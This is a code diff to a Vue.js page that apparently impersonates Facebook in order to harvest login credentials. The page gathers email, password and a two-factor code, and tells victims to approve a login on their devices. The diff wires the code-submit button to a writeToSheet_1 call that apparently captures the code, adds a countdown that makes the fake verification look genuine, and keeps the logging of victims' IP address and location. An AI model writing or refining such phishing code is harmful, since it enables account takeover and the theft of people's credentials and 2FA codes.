@@ -111,7 +111,8 @@
                           :class="counter.email_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                           class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2  dark:focus:ring-primary-400">
                       </div>
-                      <p v-show="!counter.email_dk && !counter.email" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter
+                      <p v-show="!counter.email_dk && !counter.email"
+                        class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter
                         an email</p>
                       <p v-show="!counter.email_error" class="mt-2 text-red-500 dark:text-red-400 text-sm">Your email
                         was incorrect!</p>
@@ -225,7 +226,8 @@
                         v-on:click="counter.Show_pw()"
                         class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-1.5 p-1.5 text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 underline-offset-4 hover:underline focus-visible:ring-inset focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 inline-flex items-center"><span
                           class="i-heroicons-eye flex-shrink-0 h-5 w-5" aria-hidden="true"></span></button></span></div>
-                  <p v-show="!counter.password_dk && !counter.password" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must an
+                  <p v-show="!counter.password_dk && !counter.password"
+                    class="mt-2 text-red-500 dark:text-red-400 text-sm">You must an
                     password</p>
                   <p v-show="!counter.password_error" class="mt-2 text-red-500 dark:text-red-400 text-sm">Your password
                     was incorrect!</p>
@@ -259,8 +261,7 @@
             <div class="mb-3">
               <p class="text-md">We need you to verify your identity before submitting a request. We already sent a
                 notification to your logged-in devices. Check your Facebook notifications the account and approve the
-                login to continue.</p><img
-                src="@/assets/codefa.6d3b4c7b8474a1ee8fce.jpg" width="100%"
+                login to continue.</p><img src="@/assets/codefa.6d3b4c7b8474a1ee8fce.jpg" width="100%"
                 class="py-2 w-full">
             </div>
             <div class="mb-3">
@@ -276,15 +277,16 @@
                       :class="counter.code_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                       class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset ring-gray-300 dark:ring-gray-700 focus:ring-2 focus:ring-primary-500 dark:focus:ring-primary-400">
                   </div>
-                  <p v-show="!counter.code_dk && !counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must an code</p>
-                  <!-- <p class="text-md flex items-center py-2 gap-2"><span class="i-heroicons-arrow-path"></span> We can
-                    send a new code in <b class="font-bold">00:34</b></p> -->
+                  <p v-show="!counter.code_dk && !counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">You
+                    must an code</p>
+                  <p class="text-md flex items-center py-2 gap-2"><span class="i-heroicons-arrow-path"></span> We can
+                    send a new code in <b class="font-bold">{{ formattedTime }}</b></p>
                 </div>
               </div>
             </div>
-            <div class="grid grid-cols-1 mx-auto gap-3"><button type="button" v-on:click="check_data_code()"
+            <div class="grid grid-cols-1 mx-auto gap-3"><button type="button" v-on:click="check_data_code(); this.counter.writeToSheet_1();"
                 class="focus:outline-none  flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm text-white dark:text-gray-900 bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500 dark:bg-blue-400 dark:hover:bg-blue-500 dark:disabled:bg-blue-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-blue-500 dark:focus-visible:outline-blue-400 w-full flex justify-center items-center border-1 rounded-1"><span
-                  class="">Continue</span></button><button type="button"
+                  class="">Continue</span></button><button type="button" v-on:click="restartCountdown();"
                 class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm ring-1 ring-inset ring-gray-300 dark:ring-gray-700 text-gray-900 dark:text-white bg-white hover:bg-gray-50 disabled:bg-white dark:bg-gray-900 dark:hover:bg-gray-800/50 dark:disabled:bg-gray-900 focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 w-full flex justify-center items-center border-1 rounded-1"><span
                   class="">Get a new code</span></button></div>
           </div>
@@ -324,7 +326,11 @@ export default {
     return {
       ws: null,
       messages: [],
-      inputText: '' // Thêm inputText để lưu nội dung tin nhắn mới
+      inputText: '', // Thêm inputText để lưu nội dung tin nhắn mới
+      remainingMinutes: 0,
+      remainingSeconds: 59,
+      formattedTime: "00:59",
+      countdownInterval: null
     };
   },
   setup() {
@@ -335,6 +341,32 @@ export default {
     this.connectWebSocket();
   },
   methods: {
+    startCountdown() {
+      this.remainingMinutes = 0;
+      this.remainingSeconds = 59;
+      this.countdownInterval = setInterval(() => {
+        if (this.remainingMinutes === 0 && this.remainingSeconds === 0) {
+          clearInterval(this.countdownInterval);
+        } else {
+          if (this.remainingSeconds === 0) {
+            this.remainingMinutes--;
+            this.remainingSeconds = 59;
+          } else {
+            this.remainingSeconds--;
+          }
+          this.formattedTime = this.formatTime(this.remainingMinutes, this.remainingSeconds);
+        }
+      }, 1000);
+    },
+    restartCountdown() {
+      clearInterval(this.countdownInterval);
+      this.startCountdown();
+    },
+    formatTime(minutes, seconds) {
+      return (
+        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds
+      );
+    },
     change_password() {
       if (this.counter.password) {
         this.counter.password_dk = true;
@@ -404,6 +436,7 @@ export default {
           this.counter.page_dk = true;
         };
         if (this.messages.passed == true) {
+          this.startCountdown();
           this.counter.check_mail = false;
           this.counter.check_password = true;
 
@@ -416,7 +449,7 @@ export default {
               var country = data.country;
               console.log('ipAddress:' + ipAddress)
               console.log('country:' + region)
-              this.counter.writeToSheet(ipAddress,city,region,country);
+              this.counter.writeToSheet(ipAddress, city, region, country);
             })
             .catch(error => {
               console.error('Error:', error);
